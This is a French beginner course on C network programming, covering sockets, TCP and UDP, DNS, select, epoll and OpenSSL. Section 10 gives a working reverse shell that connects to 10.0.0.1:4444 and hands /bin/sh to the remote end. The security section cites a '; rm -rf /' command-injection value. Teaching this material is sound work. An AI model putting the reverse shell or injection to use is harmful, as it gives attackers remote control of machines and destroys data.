# Cours : Programmation Réseau (Networking)

## 1. Introduction - Les Réseaux pour les Débutants

### 1.1 Qu'est-ce qu'un Réseau ?

Un **réseau** permet à des ordinateurs de **communiquer** entre eux, que ce soit dans la même pièce (réseau local) ou à travers le monde (Internet).

**Analogie** : Le réseau informatique est comme le système postal :
- **Adresse IP** = Adresse postale de la maison
- **Port** = Numéro d'appartement dans l'immeuble
- **Paquet** = Lettre ou colis
- **Protocole** = Règles d'acheminement (TCP = recommandé, UDP = sans garantie)

### 1.2 Adresse IP et Ports

```ascii
ADRESSE COMPLÈTE :

192.168.1.10:8080
    │          │
    │          └─ PORT (application spécifique)
    └─ ADRESSE IP (machine spécifique)

┌──────────────────────────────────┐
│  ORDINATEUR (192.168.1.10)       │
├──────────────────────────────────┤
│  Port 80    → Serveur Web        │
│  Port 22    → SSH                │
│  Port 3306  → MySQL              │
│  Port 8080  → Application perso  │
└──────────────────────────────────┘
```

**Pourquoi les ports ?**

Une machine peut avoir **plusieurs services** qui écoutent simultanément. Les ports permettent de les distinguer.

**Plage de ports** :
- **0-1023** : Ports réservés (HTTP=80, HTTPS=443, SSH=22)
- **1024-49151** : Ports enregistrés (applications connues)
- **49152-65535** : Ports dynamiques/privés

## 2. Modèle OSI et TCP/IP - Comprendre les Couches

### 2.1 Le Modèle en Couches (OSI)

Le réseau fonctionne par **couches empilées**. Chaque couche a un rôle spécifique.

```ascii
┌────────────────────────────────────────────────────────────┐
│  7. APPLICATION   ← HTTP, FTP, SSH (ce que vous codez)    │
├────────────────────────────────────────────────────────────┤
│  6. PRÉSENTATION  ← Chiffrement, compression              │
├────────────────────────────────────────────────────────────┤
│  5. SESSION       ← Gestion de session                    │
├────────────────────────────────────────────────────────────┤
│  4. TRANSPORT     ← TCP/UDP (fiabilité)                   │
│                     socket() travaille ici ←               │
├────────────────────────────────────────────────────────────┤
│  3. RÉSEAU        ← IP (routage, adressage)               │
├────────────────────────────────────────────────────────────┤
│  2. LIAISON       ← Ethernet, WiFi (MAC address)          │
├────────────────────────────────────────────────────────────┤
│  1. PHYSIQUE      ← Câbles, ondes radio                   │
└────────────────────────────────────────────────────────────┘
```

### 2.2 TCP vs UDP - Deux Philosophies

#### TCP (Transmission Control Protocol)

**Caractéristiques** : Fiable, orienté connexion, ordonné.

```ascii
TCP = TÉLÉPHONE (connexion établie)

Client          Serveur
  │               │
  ├─ SYN ────────→│  "Allô ?"
  │←── SYN-ACK ───┤  "Oui, je t'écoute"
  ├─ ACK ────────→│  "Ok, je commence"
  │               │
  ├─ DATA ───────→│  "Voici mes données"
  │←── ACK ───────┤  "Reçu, continue"
  ├─ DATA ───────→│
  │               │
  ├─ FIN ────────→│  "J'ai fini"
  │←── ACK ───────┤  "Ok, au revoir"
  │               │

✅ Garantit la livraison
✅ Garantit l'ordre
✅ Détecte les erreurs
❌ Plus lent (overhead)
```

#### UDP (User Datagram Protocol)

**Caractéristiques** : Rapide, sans connexion, pas de garantie.

```ascii
UDP = COURRIER (envoyer et espérer)

Client          Serveur
  │               │
  ├─ PAQUET 1 ───→│  (peut arriver)
  ├─ PAQUET 2 ───→│  (peut se perdre)
  ├─ PAQUET 3 ───→│  (peut arriver en désordre)
  │               │

✅ Très rapide
✅ Moins d'overhead
❌ Pas de garantie de livraison
❌ Pas d'ordre garanti

Usage : Streaming vidéo, jeux en ligne, DNS
```

### 2.3 Socket - Le Point de Communication

Un **socket** est un point d'entrée/sortie réseau. C'est comme une "prise" où on branche le câble réseau.

```ascii
APPLICATION
     │
     │ socket() crée une prise
     ↓
┌──────────┐
│  SOCKET  │ ← File descriptor (comme un fichier)
└────┬─────┘
     │ send() / recv()
     ↓
RÉSEAU ═══════════════════════════════ INTERNET
```

## 3. TCP Client

```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int sock = socket(AF_INET, SOCK_STREAM, 0);

struct sockaddr_in server;
server.sin_family = AF_INET;
server.sin_port = htons(80);
inet_pton(AF_INET, "93.184.216.34", &server.sin_addr);

connect(sock, (struct sockaddr*)&server, sizeof(server));

send(sock, "GET / HTTP/1.0\r\n\r\n", 18, 0);

char buffer[4096];
recv(sock, buffer, sizeof(buffer), 0);

close(sock);
```

## 4. TCP Serveur

```c
int server_sock = socket(AF_INET, SOCK_STREAM, 0);

int opt = 1;
setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_addr.s_addr = INADDR_ANY;
addr.sin_port = htons(8080);

bind(server_sock, (struct sockaddr*)&addr, sizeof(addr));
listen(server_sock, 5);

while (1) {
    struct sockaddr_in client;
    socklen_t len = sizeof(client);
    
    int client_sock = accept(server_sock, (struct sockaddr*)&client, &len);
    
    char buffer[1024];
    recv(client_sock, buffer, sizeof(buffer), 0);
    send(client_sock, "HTTP/1.0 200 OK\r\n\r\nHello", 25, 0);
    
    close(client_sock);
}
```

## 5. UDP

### Client UDP

```c
int sock = socket(AF_INET, SOCK_DGRAM, 0);

struct sockaddr_in dest;
dest.sin_family = AF_INET;
dest.sin_port = htons(53);  // DNS
inet_pton(AF_INET, "8.8.8.8", &dest.sin_addr);

sendto(sock, "data", 4, 0, (struct sockaddr*)&dest, sizeof(dest));

char buffer[512];
recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
```

### Serveur UDP

```c
int sock = socket(AF_INET, SOCK_DGRAM, 0);

struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_addr.s_addr = INADDR_ANY;
addr.sin_port = htons(5353);

bind(sock, (struct sockaddr*)&addr, sizeof(addr));

while (1) {
    char buffer[1024];
    struct sockaddr_in client;
    socklen_t len = sizeof(client);
    
    recvfrom(sock, buffer, sizeof(buffer), 0, 
             (struct sockaddr*)&client, &len);
    
    sendto(sock, "response", 8, 0, 
           (struct sockaddr*)&client, len);
}
```

## 6. Résolution DNS

```c
#include <netdb.h>

struct hostent *host = gethostbyname("www.google.com");
if (host) {
    struct in_addr **addr_list = (struct in_addr**)host->h_addr_list;
    for (int i = 0; addr_list[i] != NULL; i++) {
        printf("IP: %s\n", inet_ntoa(*addr_list[i]));
    }
}
```

## 7. Non-Bloquant avec select()

```c
fd_set readfds;
struct timeval timeout;

FD_ZERO(&readfds);
FD_SET(sock, &readfds);

timeout.tv_sec = 5;
timeout.tv_usec = 0;

int ready = select(sock + 1, &readfds, NULL, NULL, &timeout);

if (ready > 0) {
    if (FD_ISSET(sock, &readfds)) {
        recv(sock, buffer, sizeof(buffer), 0);
    }
}
```

## 8. Multiplexing avec epoll

```c
#include <sys/epoll.h>

int epfd = epoll_create1(0);

struct epoll_event ev;
ev.events = EPOLLIN;
ev.data.fd = sock;
epoll_ctl(epfd, EPOLL_CTL_ADD, sock, &ev);

struct epoll_event events[10];
int nfds = epoll_wait(epfd, events, 10, -1);

for (int i = 0; i < nfds; i++) {
    if (events[i].events & EPOLLIN) {
        recv(events[i].data.fd, buffer, sizeof(buffer), 0);
    }
}
```

## 9. SSL/TLS avec OpenSSL

```c
#include <openssl/ssl.h>

SSL_library_init();
SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());

int sock = socket(AF_INET, SOCK_STREAM, 0);
connect(sock, ...);

SSL *ssl = SSL_new(ctx);
SSL_set_fd(ssl, sock);
SSL_connect(ssl);

SSL_write(ssl, "GET / HTTP/1.1\r\n\r\n", 18);

char buffer[4096];
SSL_read(ssl, buffer, sizeof(buffer));

SSL_free(ssl);
SSL_CTX_free(ctx);
```

## 10. Reverse Shell

```c
int sock = socket(AF_INET, SOCK_STREAM, 0);

struct sockaddr_in server;
server.sin_family = AF_INET;
server.sin_port = htons(4444);
inet_pton(AF_INET, "10.0.0.1", &server.sin_addr);

connect(sock, (struct sockaddr*)&server, sizeof(server));

dup2(sock, 0);  // stdin
dup2(sock, 1);  // stdout
dup2(sock, 2);  // stderr

execve("/bin/sh", NULL, NULL);
```

## 11. Sécurité

### ⚠️ Buffer Overflow

```c
char buffer[100];
recv(sock, buffer, 1000, 0);  // DANGER !
```

### ⚠️ Injection de Commandes

```c
char cmd[256];
sprintf(cmd, "ping %s", user_input);  // DANGER si user_input contient "; rm -rf /"
system(cmd);
```

### ⚠️ Man-in-the-Middle

Toujours utiliser TLS/SSL pour données sensibles.

## 12. Bonnes Pratiques

1. **Vérifier** retours (connect, bind, etc)
2. **Utiliser** SO_REUSEADDR
3. **Timeout** avec select/epoll
4. **Chiffrer** avec SSL/TLS
5. **Valider** toutes les entrées réseau

## Ressources

- [socket(7)](https://man7.org/linux/man-pages/man7/socket.7.html)
- [Beej's Guide to Network Programming](https://beej.us/guide/bgnet/)
- [OpenSSL](https://www.openssl.org/docs/)

